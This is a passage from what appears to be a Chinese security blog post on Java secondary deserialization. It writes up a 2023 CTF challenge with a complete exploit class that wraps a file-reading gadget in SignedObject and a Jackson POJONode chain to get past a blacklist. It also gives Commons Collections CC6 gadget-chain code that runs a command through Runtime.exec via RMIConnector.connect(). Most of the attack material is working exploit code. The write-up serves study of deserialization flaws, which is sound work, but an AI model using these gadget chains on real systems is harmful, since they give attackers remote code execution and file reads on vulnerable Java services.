class="hljs-title class_">Object</span>[]&#123;object, <span class="hljs-literal">null</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">getObject:<span class="hljs-number">179</span>, SignedObject (java.security)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">2116</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getSimpleProperty:<span class="hljs-number">1267</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getNestedProperty:<span class="hljs-number">808</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getProperty:<span class="hljs-number">884</span>, PropertyUtilsBean (org.apache.commons.beanutils)<br>getProperty:<span class="hljs-number">464</span>, PropertyUtils (org.apache.commons.beanutils)<br>compare:<span class="hljs-number">163</span>, BeanComparator (org.apache.commons.beanutils)<br>siftDownUsingComparator:<span class="hljs-number">722</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">688</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">737</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">797</span>, PriorityQueue (java.util)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeReadObject:<span class="hljs-number">1170</span>, ObjectStreamClass (java.io)<br>readSerialData:<span class="hljs-number">2178</span>, ObjectInputStream (java.io)<br>readOrdinaryObject:<span class="hljs-number">2069</span>, ObjectInputStream (java.io)<br>readObject0:<span class="hljs-number">1573</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">431</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h4 id="Jackson链"><a href="#Jackson链" class="headerlink" title="Jackson链"></a>Jackson链</h4><p>这里也是重复的事情了，如果有疑问的话可以继续参考我博客</p>
+<p>其实就是通过<code>POJONode#tostring()</code>​来进行getter的调用，那么怎么触发tostring方法呢在反序列化中，也就是两种形式</p>
+<ol>
+<li>​<code>Rome</code>​ 上述的<code>ToStringBean#tostring()</code>​</li>
+<li>​<code>BadAttributeValueExpException#readObject()</code>​</li>
+</ol>
+<p>‍</p>
+<h5 id="例题分析-2023-巅峰极客-BabyURL"><a href="#例题分析-2023-巅峰极客-BabyURL" class="headerlink" title="例题分析 - 2023 巅峰极客 BabyURL"></a>例题分析 - 2023 巅峰极客 BabyURL</h5><p>‍</p>
+<h6 id="考点分析"><a href="#考点分析" class="headerlink" title="考点分析"></a>考点分析</h6><ol>
+<li>Java代码审计</li>
+<li>Java SignedObject 二次反序列化</li>
+<li>Jackson 链反序列化漏洞</li>
+</ol>
+<p>‍</p>
+<p>给了jar包，先看目录结构</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125292.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>有两个控制器</p>
+<p>第一个是<code>hack</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125443.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>传base64的payload进来反序列化成<code>URLHelper</code>​类，但这里是他自己写的反序列化，跟进下<code>MyObjectInputStream</code>​发现写了黑名单</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125600.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<code>java.net.InetAddress&quot;,&quot;org.apache.commons.collections.Transformer&quot;,&quot;org.apache.commons.collections.functors&quot;, &quot;com.yancao.ctf.bean.URLVisiter&quot;, &quot;com.yancao.ctf.bean.URLHelper</code>​</p>
+<p>‍</p>
+<p>第二个是<code>file</code>​</p>
+<p>&#x2F;file路由会读取&#x2F;tmp&#x2F;file的内容并返回</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125770.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>再来看看黑名单的两个类</p>
+<p>​<code>URLHelper</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125946.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>在ReadObject方法中可以对<code>/tmp/file/</code>​操作，并且会用<code>visitUrl</code>​处理传入的值</p>
+<p>‍</p>
+<p>​<code>URLVisiter</code>​</p>
+<p>传入的内容不能以<code>file</code>​开头，对传入的内容进行<code>new URL()</code>​处理</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125145.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么限制我们来罗列一下</p>
+<ol>
+<li>可以打URL的一个读取文件，但是有一个黑名单拦截，但是大写即可绕过</li>
+<li>反序列化存在黑名单，但是可以打SignedObject的二次反序列化来触发<code>URLHelper</code>​类</li>
+<li>如何拼接SignedObject链呢？查看依赖发现存在Jackson链 ，想到<code>BadAttributeValueExpException</code>​ 配合 <code>POJONode</code>​ 链</li>
+</ol>
+<p>‍</p>
+<p>那么问题就解决了，编写下EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yancao.ctf;<br><br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;File:///flag&quot;</span>);<br>        urlHelper.visiter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        ser(val);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>再次访问下file即可得到flag</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125300.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h1><p>‍</p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">nvokerTransform#transform()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">RMIConnector#connect()</span> <span class="hljs-string">-&gt;&gt;</span> <span class="hljs-string">RMIConnector#findRMIServerJRMP()</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>‍</p>
+<h4 id="RMIConnector-findRMIServerJRMP-​"><a href="#RMIConnector-findRMIServerJRMP-​" class="headerlink" title="RMIConnector#findRMIServerJRMP()​"></a><code>RMIConnector#findRMIServerJRMP()</code>​</h4><p>在该方法中，将base64字符串解码后以序列化流的形式进行反序列化操作，如果能控制base64参数即可造成二次反序列化</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125459.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>网上寻找，找到同文件的<code>findRMIServer</code>​方法有调用，且判断path的开头必须为&#x2F;stub&#x2F;并截取的path后的值，所以path为我们base64序列化字符串的传入点。而path通过getURLPath获取，也就是下面urlPath属性的值，所以这里我们的思路就是通过反射修改urlPath属性的值，为&#x2F;stub&#x2F;base64_ser_str的形式</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125612.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>再往上跟找到<code>connect()</code>​方法</p>
+<h4 id="​RMIConnector-connect-​​"><a href="#​RMIConnector-connect-​​" class="headerlink" title="​RMIConnector#connect()​​"></a>​<code>RMIConnector#connect()</code>​​</h4><p>‍</p>
+<p>发现是一个public的connect方法调用了</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125804.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么现在就2个思路</p>
+<ol>
+<li>谁的方法调用了<code>connect</code>​方法并且传入的值可控，然后一直往上跟readobject或者tostring或者getter方法</li>
+<li>谁的反射可控，直接进行反射调用</li>
+</ol>
+<p>‍</p>
+<p>那么现在先写一个本地的直接反射调用的demo来触发二次反序列化</p>
+<p>‍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> RMIconnector;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_t</span> &#123;<br><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br>      <br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> serialize2Base64(map2);<br>        run(s);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize2Base64</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String base64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>        rmiConnector.connect();<br><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>那么接下来的问题就是如何把这个<code>connect()</code>​方法给利用起来，第一种方法比较难跟，但是第二种方法我们就可以联想到最简单的CC链的<code>InvokerTransformer</code>​来进行任意类任意方法调用，这样子就可以套一层反射来调用<code>connect()</code>​了</p>
+<p>‍</p>
+<p>于是就可以写出EXP，通过CC6来进行调用二次反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> RMIconnector;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_t</span> &#123;<br><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span 